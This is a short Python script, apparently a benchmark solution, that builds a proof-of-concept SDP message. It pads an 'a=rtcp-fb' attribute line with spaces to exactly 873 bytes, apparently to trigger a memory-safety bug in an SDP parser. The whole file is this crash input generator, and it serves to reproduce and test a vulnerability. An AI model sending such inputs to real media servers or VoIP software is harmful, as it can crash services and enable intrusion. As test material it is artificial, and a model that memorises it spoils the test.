import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc_lines = [
            b"v=0",
            b"o=- 376100377 1 IN IP4 127.0.0.1",
            b"s=-",
            b"t=0 0",
            b"c=IN IP4 0.0.0.0",
            b"m=audio 1 RTP/AVP 0",
        ]

        malicious_prefix = b"a=rtcp-fb:0 "
        target_len = 873

        header_blob_len = len(b'\r\n'.join(poc_lines))
        
        malicious_line_len = target_len - header_blob_len - 2
        payload_len = malicious_line_len - len(malicious_prefix)

        payload = b' ' * payload_len
        malicious_line = malicious_prefix + payload
        
        final_poc_lines = poc_lines + [malicious_line]

        poc = b"\r\n".join(final_poc_lines)

        return poc
